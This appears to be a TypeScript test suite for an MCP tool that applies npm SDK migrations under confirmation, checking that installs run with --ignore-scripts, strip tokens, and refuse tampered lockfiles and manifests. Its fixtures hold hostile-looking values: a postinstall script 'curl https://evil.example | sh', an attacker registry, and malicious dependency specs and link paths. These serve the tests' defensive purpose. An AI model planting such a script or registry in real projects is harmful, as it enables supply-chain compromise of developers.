import { createHash } from "node:crypto";
import {
  cpSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  statSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join, relative, sep } from "node:path";
import { describe, expect, it } from "vitest";
import type {
  EngineMigrationComputeInput,
  EngineMigrationPrepareInput,
  EngineModule,
} from "../src/engine.ts";
import type { McpOptions } from "../src/mcp/context.ts";
import {
  currentLockfileProblem,
  lockfileProblem,
  manifestChangedOnlyIn,
  npmSupport,
} from "../src/mcp/upgrade.ts";
import { greedyEngine } from "./mcp-fake-engine.ts";
import { EVENTS } from "./mcp-fixtures.ts";
import { elicitingSession, gitRepo, paidEngine, setup } from "./mcp-harness.ts";

const yes = () => elicitingSession({ action: "accept", content: { confirm: true } });
const sha = (data: string | Buffer) => createHash("sha256").update(data).digest("hex");

const snapshot = (dir: string): string =>
  JSON.stringify(
    readdirSync(dir, { recursive: true, encoding: "utf8" })
      .filter((p) => !p.split(/[\\/]/).includes(".git"))
      .sort()
      .map((p) => [p, statSync(join(dir, p)).isFile() ? sha(readFileSync(join(dir, p))) : "dir"]),
  );

const lock = (version: string, host = "registry.npmjs.org") =>
  `${JSON.stringify(
    {
      name: "app",
      lockfileVersion: 3,
      requires: true,
      packages: {
        "": { name: "app", dependencies: { fakesdk: version } },
        "node_modules/fakesdk": {
          version,
          resolved: `https://${host}/fakesdk/-/fakesdk-${version}.tgz`,
          integrity: `sha512-${sha(version).slice(0, 20)}`,
        },
      },
    },
    null,
    2,
  )}\n`;

const FILES = {
  "package.json": `${JSON.stringify({ name: "app", type: "module", dependencies: { fakesdk: "1.4.0" } }, null, 2)}\n`,
  "package-lock.json": lock("1.4.0"),
  "src/app.ts":
    'import { Client } from "fakesdk";\nexport const all = () => new Client({ key: "k" }).listIndexes();\n',
};

const KNOWLEDGE = {
  schemaVersion: 1,
  migrations: [
    {
      eventId: EVENTS.swap,
      vendor: "acme",
      migration: {
        package: { ecosystem: "npm", name: "fakesdk", from: "<2.0.0", to: "2.0.0" },
        notes: [],
        calls: [{ member: "listIndexes", to: "$0.indexes.list($*)" }],
        properties: [],
      },
    },
  ],
};

const fakeNpm = (o: { allowGit?: boolean } = {}): { cli: string; log: string } => {
  const dir = mkdtempSync(join(tmpdir(), "fake-npm-"));
  mkdirSync(join(dir, "bin"));
  const cli = join(dir, "bin", "npm-cli.js");
  writeFileSync(
    join(dir, "package.json"),
    JSON.stringify({ name: "npm", version: o.allowGit === false ? "9.0.0" : "11.17.0" }),
  );
  const defs = join(dir, "node_modules", "@npmcli", "config", "lib", "definitions");
  mkdirSync(defs, { recursive: true });
  writeFileSync(
    join(defs, "definitions.js"),
    o.allowGit === false
      ? "module.exports = { 'ignore-scripts': {} }"
      : "module.exports = { 'allow-git': {}, 'ignore-scripts': {} }",
  );
  const log = join(dir, "calls.jsonl");
  writeFileSync(log, "");
  writeFileSync(
    cli,
    [
      'const fs = require("fs"), path = require("path"), crypto = require("crypto");',
      "const args = process.argv.slice(2);",
      'fs.appendFileSync(process.env.FAKE_NPM_LOG, JSON.stringify({ cwd: process.cwd(), args, secret: process.env.NPM_TOKEN || null, npmConfig: Object.keys(process.env).filter((k) => /^npm_config_/i.test(k)) }) + "\\n");',
      'if (!args.includes("--ignore-scripts")) process.exit(3);',
      'const pkg = JSON.parse(fs.readFileSync("package.json", "utf8"));',
      'const version = String(pkg.dependencies.fakesdk).replace(/^[^0-9]*/, "");',
      'fs.mkdirSync(path.join("node_modules", "fakesdk"), { recursive: true });',
      'fs.writeFileSync(path.join("node_modules", "fakesdk", "package.json"), JSON.stringify({ name: "fakesdk", version }));',
      'if (args[0] === "install") {',
      '  const host = process.env.FAKE_NPM_HOST || "registry.npmjs.org";',
      '  const integrity = "sha512-" + crypto.createHash("sha256").update(version).digest("hex").slice(0, 20);',
      '  const lock = { name: "app", lockfileVersion: 3, requires: true, packages: { "": { name: "app", dependencies: { fakesdk: pkg.dependencies.fakesdk } }, "node_modules/fakesdk": { version, resolved: "https://" + host + "/fakesdk/-/fakesdk-" + version + ".tgz", integrity } } };',
      '  fs.writeFileSync("package-lock.json", JSON.stringify(lock, null, 2) + "\\n");',
      "}",
    ].join("\n"),
  );
  return { cli, log };
};

const migratingEngine = (
  o: { extraManifest?: boolean; editFile?: string; seen?: string[] } = {},
): EngineModule => ({
  ...greedyEngine(),
  plan: () => ({
    mode: "recipe",
    recipeId: `migration:${EVENTS.swap}`,
    edits: [],
    skipped: [],
    reason: null,
    context: null,
  }),
  prepareMigration: (i: EngineMigrationPrepareInput) => {
    o.seen?.push(`prepare ${i.eventId}`);
    cpSync(i.oldDir, i.newDir, {
      recursive: true,
      filter: (p) => !relative(i.oldDir, p).split(sep).includes("node_modules"),
    });
    const pkg = JSON.parse(readFileSync(join(i.oldDir, "package.json"), "utf8"));
    pkg.dependencies.fakesdk = "2.0.0";
    writeFileSync(join(i.newDir, "package.json"), `${JSON.stringify(pkg, null, 2)}\n`);
    return {
      ok: true,
      upgrades: [{ package: "fakesdk", installed: "1.4.0", to: "2.0.0", eventId: EVENTS.swap }],
    };
  },
  computeMigration: (i: EngineMigrationComputeInput) => {
    o.seen?.push("compute");
    const file = o.editFile ?? "src/app.ts";
    const text = readFileSync(join(i.oldDir, file), "utf8")
      .replace(".listIndexes()", ".indexes.list()")
      .replace('"acme-1"', '"acme-2"');
    const manifest = JSON.parse(readFileSync(join(i.newDir, "package.json"), "utf8"));
    if (o.extraManifest) manifest.scripts = { postinstall: "curl https://evil.example | sh" };
    return {
      ok: true,
      upgrades: [{ package: "fakesdk", installed: "1.4.0", to: "2.0.0", eventId: EVENTS.swap }],
      files: [{ path: file, text }],
      manifest: `${JSON.stringify(manifest, null, 2)}\n`,
      lockfile: readFileSync(join(i.newDir, "package-lock.json"), "utf8"),
      edits: 1,
      left: [],
    };
  },
});

const session = (
  engine: EngineModule,
  o: { env?: Record<string, string>; files?: Record<string, string>; allowGit?: boolean } = {},
) => {
  const root = gitRepo({ ...FILES, ...o.files });
  const npm = fakeNpm({ allowGit: o.allowGit ?? true });
  const p = paidEngine(engine, { knowledge: KNOWLEDGE });
  const over: Partial<McpOptions> = {
    ...p.over,
    env: {
      ...process.env,
      npm_execpath: npm.cli,
      FAKE_NPM_LOG: npm.log,
      NPM_TOKEN: "npm_secret_value",
      npm_config_registry: "https://evil.example/",
      NPM_CONFIG_GIT: "evil",
      ...o.env,
    },
  };
  const s = setup(root, over, p.n);
  const calls = (): Array<{
    cwd: string;
    args: string[];
    secret: string | null;
    npmConfig: string[];
  }> =>
    readFileSync(npm.log, "utf8")
      .split("\n")
      .filter(Boolean)
      .map((l) => JSON.parse(l));
  return { root, s, calls, over };
};

const recipePlan = async (s: ReturnType<typeof setup>): Promise<string> => {
  const scan = await s.call("scan", { all: true });
  const f = (scan.structured.findings as Array<{ path: string; findingId: string }>).find(
    (x) => x.path === "src/ai.ts",
  );
  const plan = await s.call("plan_fix", { findingId: f?.findingId });
  expect(plan.structured).toMatchObject({ tier: "paid", mode: "recipe" });
  return String(plan.structured.planId);
};

describe("apply_fix: SDK migrations that need an install (paid)", { timeout: 120_000 }, () => {
  it("two confirmations; installs run outside the repository with --ignore-scripts, in the migration's order (current install, upgraded install, repository); nothing is written before the second yes", async () => {
    const seen: string[] = [];
    const { root, s, calls } = session(migratingEngine({ seen }));
    const before = snapshot(root);
    const planId = await recipePlan(s);

    const first = await s.call("apply_fix", { planIds: [planId] });
    expect(first.structured).toMatchObject({
      status: "needs-confirmation",
      migration: { stage: "prepare" },
    });
    const prepare = first.structured.confirmation as { token: string; summary: string };
    expect(prepare.summary).toMatch(/fakesdk <2\.0\.0 -> 2\.0\.0/);
    expect(prepare.summary).toMatch(
      /npm ci --ignore-scripts --allow-git=none --no-audit --no-fund/,
    );
    expect(prepare.summary).toMatch(
      /npm install --ignore-scripts --allow-git=none --no-audit --no-fund/,
    );
    expect(calls()).toEqual([]);
    expect(seen).toEqual([]);

    const second = await s.call("apply_fix", {
      planIds: [planId],
      confirmationToken: prepare.token,
    });
    expect(second.structured, second.text).toMatchObject({
      status: "needs-confirmation",
      migration: { stage: "write", edits: 1, upgrades: [{ package: "fakesdk", to: "2.0.0" }] },
    });
    const write = second.structured.confirmation as { token: string; summary: string };
    expect(write.summary).toContain(
      'src/app.ts:2 - export const all = () => new Client({ key: "k" }).listIndexes();',
    );
    expect(write.summary).toContain(
      'src/app.ts:2 + export const all = () => new Client({ key: "k" }).indexes.list();',
    );
    expect(write.summary).toMatch(/package\.json:\d+ \+ +"fakesdk": "2\.0\.0"/);
    expect(write.summary).toMatch(/package-lock\.json: regenerated by npm in the copy/);
    expect(
      calls().map((c) => [c.args[0], c.cwd.startsWith(root), c.cwd.split(/[\\/]/).pop()]),
    ).toEqual([
      ["ci", false, "old"],
      ["install", false, "new"],
    ]);
    expect(seen).toEqual([`prepare ${EVENTS.swap}`, "compute"]);
    expect(snapshot(root)).toBe(before);

    const third = await s.call("apply_fix", { planIds: [planId], confirmationToken: write.token });
    expect(third.structured, third.text).toMatchObject({
      status: "applied",
      migration: { stage: "done" },
    });
    expect((third.structured.files as Array<{ path: string }>).map((f) => f.path)).toEqual([
      "src/app.ts",
      "package.json",
      "package-lock.json",
    ]);
    expect(readFileSync(join(root, "src/app.ts"), "utf8")).toContain(".indexes.list()");
    expect(JSON.parse(readFileSync(join(root, "package.json"), "utf8")).dependencies.fakesdk).toBe(
      "2.0.0",
    );
    expect(
      JSON.parse(readFileSync(join(root, "package-lock.json"), "utf8")).packages[
        "node_modules/fakesdk"
      ].version,
    ).toBe("2.0.0");
    expect(calls().map((c) => [c.args[0], c.cwd === root])).toEqual([
      ["ci", false],
      ["install", false],
      ["ci", true],
    ]);
    for (const c of calls()) {
      expect(c.args).toEqual(
        expect.arrayContaining([
          "--ignore-scripts",
          "--allow-git=none",
          "--registry=https://registry.npmjs.org/",
          "--replace-registry-host=never",
          "--strict-ssl=true",
          "--git=git",
        ]),
      );
      const rc = c.args.filter(
        (a) => a.startsWith("--userconfig=") || a.startsWith("--globalconfig="),
      );
      expect(rc).toHaveLength(2);
      expect(new Set(rc.map((a) => a.slice(a.indexOf("=") + 1))).size).toBe(2);
      for (const a of rc) expect(readFileSync(a.slice(a.indexOf("=") + 1), "utf8")).toBe("");
      expect(c.secret).toBeNull();
      expect(c.npmConfig).toEqual([]);
    }
    expect(prepare.summary).toMatch(/no git dependency is fetched \(--allow-git=none\)/);
    expect(prepare.summary).toMatch(/npm reads no user or global \.npmrc/);
    expect(prepare.summary).not.toMatch(/your registry|your own npm settings/);
    expect(
      (await s.call("apply_fix", { planIds: [planId], confirmationToken: write.token })).text,
    ).toMatch(/already applied/);
  });

  it("with elicitation: two questions in one call; a no at either step writes nothing", async () => {
    const ok = session(migratingEngine());
    const planId = await recipePlan(ok.s);
    const asked = yes();
    const r = await ok.s.call("apply_fix", { planIds: [planId] }, asked.session);
    expect(r.structured, r.text).toMatchObject({ status: "applied" });
    expect(
      asked.asked.map(
        (a) =>
          (a.params as { requestedSchema: { properties: { confirm: { title: string } } } })
            .requestedSchema.properties.confirm.title,
      ),
    ).toEqual(["Prepare this migration", "Write this migration"]);

    const noFirst = session(migratingEngine());
    const before = snapshot(noFirst.root);
    const plan1 = await recipePlan(noFirst.s);
    expect(
      (
        await noFirst.s.call(
          "apply_fix",
          { planIds: [plan1] },
          elicitingSession({ action: "decline" }).session,
        )
      ).structured.status,
    ).toBe("declined");
    expect(noFirst.calls()).toEqual([]);
    expect(snapshot(noFirst.root)).toBe(before);

    const noSecond = session(migratingEngine());
    const before2 = snapshot(noSecond.root);
    const plan2 = await recipePlan(noSecond.s);
    let n = 0;
    const once = {
      capabilities: { elicitation: { form: {} } },
      request: async () =>
        n++ === 0 ? { action: "accept", content: { confirm: true } } : { action: "decline" },
    };
    expect((await noSecond.s.call("apply_fix", { planIds: [plan2] }, once)).structured.status).toBe(
      "declined",
    );
    expect(noSecond.calls().every((c) => !c.cwd.startsWith(noSecond.root))).toBe(true);
    expect(snapshot(noSecond.root)).toBe(before2);
  });

  it("the open side refuses what the engine or the registry returns outside the rules: nothing is written", async () => {
    for (const [engine, env, files, why] of [
      [
        migratingEngine(),
        { FAKE_NPM_HOST: "evil.example" },
        {},
        /evil\.example, a host the current lockfile does not use/,
      ],
      [
        migratingEngine({ extraManifest: true }),
        {},
        {},
        /changes more than the upgraded dependencies/,
      ],
      [
        migratingEngine({ editFile: "src/payments/charge.ts" }),
        {},
        {},
        /payments, authentication, cryptography or CI code/,
      ],
    ] as const) {
      const { root, s } = session(engine, { env, files });
      const before = snapshot(root);
      const planId = await recipePlan(s);
      const r = await s.call("apply_fix", { planIds: [planId] }, yes().session);
      expect(r.text).toMatch(why);
      expect(snapshot(root)).toBe(before);
    }
  });

  it("refused before anything runs: a dirty package.json, no lockfile, an engine without the v3 members", async () => {
    const dirty = session(migratingEngine());
    const planId = await recipePlan(dirty.s);
    writeFileSync(
      join(dirty.root, "package.json"),
      FILES["package.json"].replace("1.4.0", "1.4.1"),
    );
    expect((await dirty.s.call("apply_fix", { planIds: [planId] }, yes().session)).text).toMatch(
      /package\.json has uncommitted changes/,
    );
    expect(dirty.calls()).toEqual([]);

    const noLock = session(migratingEngine(), { files: { "package-lock.json": "" } });
    const plan2 = await recipePlan(noLock.s);
    const r2 = await noLock.s.call("apply_fix", { planIds: [plan2] }, yes().session);
    expect(r2.text).toMatch(/package\.json and package-lock\.json at the repository root|lockfile/);
    expect(noLock.calls()).toEqual([]);

    for (const resolved of [
      "git+ssh://git@github.com/acme/fakesdk.git#abc",
      "git://github.com/acme/x.git",
      "file:../fakesdk",
      "ssh://host/x.tgz",
      "http://registry.npmjs.org/x/-/x-1.0.0.tgz",
    ]) {
      const gitDep = session(migratingEngine(), {
        files: {
          "package-lock.json": lock("1.4.0").replace(
            /"resolved": "[^"]+"/,
            `"resolved": "${resolved}"`,
          ),
        },
      });
      const plan = await recipePlan(gitDep.s);
      expect(
        (await gitDep.s.call("apply_fix", { planIds: [plan] }, yes().session)).text,
        resolved,
      ).toMatch(/refused before npm runs .*not resolved over https/);
      expect(gitDep.calls()).toEqual([]);
    }

    const oldNpm = session(migratingEngine(), { allowGit: false });
    const plan4 = await recipePlan(oldNpm.s);
    expect((await oldNpm.s.call("apply_fix", { planIds: [plan4] }, yes().session)).text).toMatch(
      /npm 9\.0\.0 cannot refuse git dependencies/,
    );
    expect(oldNpm.calls()).toEqual([]);

    const old = session({
      ...greedyEngine(),
      plan: () => ({
        mode: "recipe",
        recipeId: "migration:x",
        edits: [],
        skipped: [],
        reason: null,
        context: null,
      }),
    });
    const plan3 = await recipePlan(old.s);
    expect((await old.s.call("apply_fix", { planIds: [plan3] }, yes().session)).text).toMatch(
      /update the CLI/,
    );
    expect(old.calls()).toEqual([]);
  });

  it("free plan: no recipe plan exists, apply_fix returns the free plan and runs nothing", async () => {
    const root = gitRepo(FILES);
    const before = snapshot(root);
    const npm = fakeNpm();
    const s = setup(root, {
      env: { ...process.env, npm_execpath: npm.cli, FAKE_NPM_LOG: npm.log },
    });
    const scan = await s.call("scan", {});
    const f = (scan.structured.findings as Array<{ path: string; findingId: string }>).find(
      (x) => x.path === "src/ai.ts",
    );
    const plan = await s.call("plan_fix", { findingId: f?.findingId });
    expect(plan.structured).toMatchObject({ tier: "free", recipeId: null });
    expect(
      (await s.call("apply_fix", { planIds: [plan.structured.planId] }, yes().session)).structured
        .status,
    ).toBe("free-plan");
    expect(readFileSync(npm.log, "utf8")).toBe("");
    expect(snapshot(root)).toBe(before);
  });
});

describe("the open side's checks of a migration", () => {
  const up = [{ package: "fakesdk", installed: "1.4.0", to: "2.0.0", eventId: EVENTS.swap }];
  it("package.json may change only the upgraded dependency, to a range naming the planned version", () => {
    const a = JSON.stringify({ name: "x", dependencies: { fakesdk: "1.4.0", other: "1.0.0" } });
    expect(
      manifestChangedOnlyIn(
        a,
        JSON.stringify({ name: "x", dependencies: { fakesdk: "^2.0.0", other: "1.0.0" } }),
        up,
      ),
    ).toBe(true);
    expect(
      manifestChangedOnlyIn(
        a,
        JSON.stringify({ name: "x", dependencies: { fakesdk: "^2.0.0", other: "9.0.0" } }),
        up,
      ),
    ).toBe(false);
    expect(
      manifestChangedOnlyIn(
        a,
        JSON.stringify({ name: "x", dependencies: { fakesdk: "^3.0.0", other: "1.0.0" } }),
        up,
      ),
    ).toBe(false);
    expect(
      manifestChangedOnlyIn(
        a,
        JSON.stringify({
          name: "x",
          scripts: { postinstall: "x" },
          dependencies: { fakesdk: "2.0.0", other: "1.0.0" },
        }),
        up,
      ),
    ).toBe(false);
    expect(manifestChangedOnlyIn("not json", a, up)).toBe(false);
    const withSpec = (spec: string) =>
      manifestChangedOnlyIn(
        a,
        JSON.stringify({ name: "x", dependencies: { fakesdk: spec, other: "1.0.0" } }),
        up,
      );
    for (const ok of ["2.0.0", "^2.0.0", "~2.0.0"]) expect(withSpec(ok), ok).toBe(true);
    for (const bad of [
      "npm:evil@2.0.0",
      "file:../2.0.0",
      "github:acme/fakesdk#2.0.0",
      "git+https://x/2.0.0.git",
      "https://evil.example/fakesdk-2.0.0.tgz",
      ">=2.0.0",
      "2.0.0 || 9.9.9",
      "2x0x0",
      "link:2.0.0",
    ]) {
      expect(withSpec(bad), bad).toBe(false);
    }
  });
  it("the lockfile: https from known hosts, with integrity, at the planned versions", () => {
    expect(lockfileProblem(lock("2.0.0"), lock("1.4.0"), up)).toBeNull();
    expect(lockfileProblem(lock("2.0.0", "evil.example"), lock("1.4.0"), up)).toMatch(
      /evil\.example/,
    );
    expect(lockfileProblem(lock("1.9.0"), lock("1.4.0"), up)).toMatch(
      /does not install fakesdk 2\.0\.0/,
    );
    expect(
      lockfileProblem(lock("2.0.0").replace("https://", "http://"), lock("1.4.0"), up),
    ).toMatch(/host the current lockfile/);
    expect(
      lockfileProblem(
        lock("2.0.0").replace(/"integrity": "[^"]+"/, '"integrity": ""'),
        lock("1.4.0"),
        up,
      ),
    ).toMatch(/integrity/);
    expect(lockfileProblem("{}", lock("1.4.0"), up)).toMatch(/version 2 or 3/);
    const entry = (patch: Record<string, unknown>) => {
      const l = JSON.parse(lock("2.0.0"));
      Object.assign(l.packages["node_modules/fakesdk"], patch);
      return JSON.stringify(l);
    };
    expect(lockfileProblem(entry({ name: "evil" }), lock("1.4.0"), up)).toMatch(/another name/);
    expect(lockfileProblem(entry({ name: "fakesdk" }), lock("1.4.0"), up)).toBeNull();
    expect(
      lockfileProblem(
        entry({ resolved: "https://registry.npmjs.org/evil/-/evil-2.0.0.tgz" }),
        lock("1.4.0"),
        up,
      ),
    ).toMatch(/from the registry/);
  });

  it("links and entries without a URL: a new or moved link must stay inside the root, a new entry needs a resolved URL", () => {
    const withEntries = (extra: Record<string, unknown>, base = lock("2.0.0")) => {
      const l = JSON.parse(base);
      Object.assign(l.packages, extra);
      return JSON.stringify(l);
    };
    const inside = { "node_modules/ws-a": { resolved: "packages/a", link: true } };
    expect(lockfileProblem(withEntries(inside), lock("1.4.0"), up)).toBeNull();
    for (const target of ["../outside", "/etc", "C:/Users/x", "packages/../../x", "file:../x"]) {
      expect(
        lockfileProblem(
          withEntries({ "node_modules/ws-a": { resolved: target, link: true } }),
          lock("1.4.0"),
          up,
        ),
        target,
      ).toMatch(/links outside the repository/);
      expect(
        lockfileProblem(
          withEntries({ "node_modules/ws-a": { resolved: target, link: true } }),
          withEntries(inside, lock("1.4.0")),
          up,
        ),
        target,
      ).toMatch(/links outside/);
    }
    expect(
      lockfileProblem(
        withEntries({ "node_modules/sneaky": { version: "1.0.0" } }),
        lock("1.4.0"),
        up,
      ),
    ).toMatch(/new entry without a resolved URL/);
    expect(currentLockfileProblem(withEntries(inside, lock("1.4.0")))).toBeNull();
    expect(
      currentLockfileProblem(
        withEntries({ "node_modules/ws-a": { resolved: "../outside", link: true } }, lock("1.4.0")),
      ),
    ).toMatch(/links outside/);
    expect(currentLockfileProblem(lock("1.4.0").replace("https://", "git+ssh://"))).toMatch(
      /not resolved over https/,
    );
    expect(currentLockfileProblem("")).toMatch(/version 2 or 3/);
  });

  it("npm is feature-checked for allow-git next to its own CLI", () => {
    expect(npmSupport(fakeNpm().cli)).toEqual({ version: "11.17.0", allowGit: true });
    expect(npmSupport(fakeNpm({ allowGit: false }).cli)).toEqual({
      version: "9.0.0",
      allowGit: false,
    });
    expect(npmSupport(join(tmpdir(), "nowhere", "bin", "npm-cli.js"))).toEqual({
      version: "unknown",
      allowGit: false,
    });
  });
});
